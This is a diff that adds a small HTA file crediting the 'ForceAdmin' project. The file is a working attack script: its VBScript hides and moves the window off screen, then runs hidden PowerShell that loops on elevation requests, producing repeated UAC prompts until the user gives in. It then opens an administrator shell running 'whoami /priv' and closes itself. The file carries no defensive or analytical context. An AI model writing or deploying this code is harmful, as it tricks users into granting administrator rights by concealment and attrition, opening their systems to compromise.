@@ -1,0 +1,15 @@
+<html>
+<head>
+<!-- https://github.com/Chainski/ForceAdmin -->
+<script language="VBScript">
+    Window.ReSizeTo 0, 0
+	Window.MoveTo -4000, -4000
+    Dim ForceAdmin
+    Set ForceAdmin = CreateObject("WScript.Shell")
+    elevate="powershell -command ""while($true){try{Start-Process 'cmd' -Verb runas -ArgumentList '/k whoami /priv';exit}catch{}}"""
+    ForceAdmin.Run elevate, 0, false
+    self.close()
+</script>
+<body>
+</body>
+</html>
